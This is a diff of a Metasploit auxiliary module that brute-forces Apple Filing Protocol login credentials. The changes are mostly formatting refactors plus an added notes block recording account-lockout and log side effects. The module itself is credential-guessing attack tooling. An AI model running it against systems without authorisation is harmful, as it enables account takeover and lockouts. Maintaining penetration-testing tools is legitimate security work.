@@ -13,37 +13,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::AFP
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'         => 'Apple Filing Protocol Login Utility',
-      'Description'  => %q{
-        This module attempts to bruteforce authentication credentials for AFP.
-      },
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Apple Filing Protocol Login Utility',
+        'Description' => %q{
+          This module attempts to bruteforce authentication credentials for AFP.
+        },
+        'References' => [
           [ 'URL', 'https://web.archive.org/web/20130309051753/https://developer.apple.com/library/mac/#documentation/Networking/Reference/AFP_Reference/Reference/reference.html' ],
           [ 'URL', 'https://developer.apple.com/library/mac/documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html' ]
 
         ],
-      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
-      'License'      => MSF_LICENSE
-    ))
+        'Author' => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         Opt::Proxies,
-        OptInt.new('LoginTimeOut', [ true, "Timeout on login", 23 ]),
-        OptBool.new('RECORD_GUEST', [ false, "Record guest login to the database", false]),
-        OptBool.new('CHECK_GUEST', [ false, "Check for guest login", true])
-      ], self)
+        OptInt.new('LoginTimeOut', [ true, 'Timeout on login', 23 ]),
+        OptBool.new('RECORD_GUEST', [ false, 'Record guest login to the database', false]),
+        OptBool.new('CHECK_GUEST', [ false, 'Check for guest login', true])
+      ]
+    )
   end
 
   def run_host(ip)
-    print_status("Scanning IP: #{ip.to_s}")
+    print_status("Scanning IP: #{ip}")
 
     cred_collection = build_credential_collection(
-        username: datastore['USERNAME'],
-        password: datastore['PASSWORD'],
+      username: datastore['USERNAME'],
+      password: datastore['PASSWORD']
     )
 
     scanner = Metasploit::Framework::LoginScanner::AFP.new(
@@ -71,8 +79,8 @@ class MetasploitModule < Msf::Auxiliary
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
-          module_fullname: self.fullname,
-          workspace_id: myworkspace_id
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
       )
       if result.success?
         credential_core = create_credential(credential_data)
@@ -86,6 +94,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
-
-
 end
